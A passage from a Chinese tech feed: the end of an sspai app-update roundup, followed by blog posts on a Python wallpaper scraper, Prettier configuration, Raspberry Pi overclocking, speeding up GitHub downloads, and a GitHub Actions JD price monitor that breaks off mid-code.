src=\"https://cdn.sspai.com/editor/u_/c5dbicdb34teit0pn1qg.jpeg\"></figure><p>第二项更新则重点调用了「Live Text」功能，在编辑待办备注时，长按编辑区就可以使用这一功能，通过摄像头识别文字快速录入信息。由于应用并不支持将识别内容自动转化为任务或是子任务，且只能在备注区域使用，这一功能主要还是用于信息补充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbicdb34teh5fkvjvg.jpeg\"></figure><p>第三项优化则是针对 iOS 15 新的通知逻辑，新版在系统通知中增加了「时效性通知」一项，启用后无论你是选择立即推送还是定时摘要，又或是在专注模式下允许时效性通知，都不会错过重要的任务提醒。此外，Things 通知也支持 Siri 语音播报，在驾车或其他忙碌状况下不方便查看通知时，让 Siri 直接阅读待办事项的标题，方便你更高效地处理事务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiclb34teit0pn1r0.jpeg\"></figure><p>Things 这个小版本更新内容还不止这些，新版增加了 Apple Watch 息屏显示，对 iPadOS 15 快速备忘录进行适配，iPad 外接键盘操作以及快捷指令也得到了小幅优化，虽说都是些小修小改，但对于效率提升还是非常明显的。</p>\n<p>Things <a href=\"https://apps.apple.com/cn/app/things-3/id904237743\" target=\"_blank\">iOS 版本</a> 售价 68 元，<a href=\"https://apps.apple.com/cn/app/things-3-for-ipad/id904244226\" target=\"_blank\">iPadOS 版本</a> 售价 128 元，你可以在 App Store 上下载使用。</p>\n<span class=\"ss-application\" app-id=\"12476\"> </span><h3>iWork：办公三件套大更新，让线上协作更加便利</h3>\n<ul>\n<li>平台：iOS / iPadOS / macOS</li>\n<li>关键词：办公、协作、讲演</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：虽然在办公套件领域，Microsoft Office 是其中的霸主，但如果你的设备都是 Apple 的产品，那么 iWork 可以充分利用你的设备，获得跨平台且无缝的应用功能体验，这也体现在近期更新的 iWork 套件中。</p>\n<p>首先，对于经常使用 Keynote 讲演来制作演示文稿的朋友，近期更新中加入了一项非常实用的功能：利用 iPhone、iPad 以及 Mac 的前置摄像头，直接在演示文稿中加入实时视频。你可以调整视频大小，使用面具、画框、投影和映像加以装饰，同时 Mac 用户还可以一次连接过个摄像头，实现临场感。甚至可以在演示时在文稿中显示 iPhone 和 iPad 的屏幕内容，所以这个功能非常适合在进行远程会议进行项目演示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbid5b34teh3cl8sgg.gif\"></figure><p>另一项新功能同样服务于演示文稿：多演讲者选项，这个功能可以让参与者使用 iPhone、iPad 或者 Mac 直接控制并共享演示文稿的播放，并且无论是参与者处于同一个地理位置还是通过远程进行协作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiddb34teh3cl8sh0.jpeg\"></figure><p>另一项较大的更新是专门针对 iPhone 上使用 Pages 文稿，新版本屏幕视图会自动在专为 iPhone 屏幕优化的单栏连续流动视图中显示文本、图片等其他元素。文本字号会增大以便阅读，照片和图画会自动缩放以适应屏幕，表格也可横向滚动显示。屏幕视图适用于所有文字处理文档，且无需额外设置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbidlb34teh5fkvk00.gif\"></figure><p>最后的一项更新则是为 Numbers 表格加入了一项新功能：数据透视表，通过数据透视表可以快速的汇总、分组、重新整理数据，以辨认出模式与趋势，并对它们加以分析，创建方式也很简单——用户可以轻松选取需要的数据，选择如何对其进行分组与汇总，并在边栏访问其他显示选项，并且该功能适用于全平台的 Numbers 表格。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbie5b34teh5fkvk0g.jpeg\"></figure><p>同时Numbers 表格还加入了雷达图这个新的图标类型，可以实现多个变量对比，用重叠区域显示它们的相同点，从而突显不同点和异常值。新的过滤选项可以帮助用户在数据中发现重复条目和唯一值，也可轻松显示或隐藏匹配特定值的行列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbie5b34teh3cl8shg.jpeg\"></figure><p>最后，新版 iWork 在 iOS 15、iPadOS 15 以及macOS Monterey 上支持翻译功能，选取文本，快速看到翻译内容或听到内容被大声朗读，并立即用译文替换选中的文本。 你可以在 App Store 免费获取 iWork 的新版本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbiedb34teh5fkvk10.jpeg\"></figure><span class=\"ss-application\" app-id=\"14925\"> </span><span class=\"ss-application\" app-id=\"8729\"> </span><span class=\"ss-application\" app-id=\"15495\"> </span><h2>App 速报</h2>\n<ul>\n<li>Craft (<a href=\"https://www.craft.do/whats-new\" target=\"_blank\">iOS / iPadOS / macOS</a>)：适配 iOS / iPadOS 15，支持实况文本功能；增加图片标注功能更，网页版本等也有多项优化。</li>\n<li>Adobe Lightroom (<a href=\"https://blog.adobe.com/en/publish/2021/09/28/from-the-acr-team-masking-reimagined.html\" target=\"_blank\">macOS</a>)：加入了基于 AI 的蒙版功能，使用方法和 Photoshop 中的蒙版工具类似，可以在照片中快速调整某个区域，同时排除其他对象。</li>\n<li>Dropbox Capture (<a href=\"https://www.dropbox.com/capture\" target=\"_blank\">Windows / macOS</a>)：Dropbox 推出的截屏工具，用户可以使用该工具进行屏幕截图、通过录制 GIF 或者简单的视频来传达工作内容。</li>\n<li>PowerToys (<a href=\"https://github.com/microsoft/PowerToys/releases/tag/v0.47.0\" target=\"_blank\">Windows 10</a>)：更新至 v0.47.0，在资源管理器中现在添加了 PDF 预览插件，重新添加了长按 Windows 徽标键激活快捷指南功能。</li>\n<li>Newsletter 订阅和管理服务 <a href=\"https://mailbrew.com/\" target=\"_blank\">Mailbrew</a> 宣布停止提供免费版计划，同时付费版方案将至 4.99 美元 / 月。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69105"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - 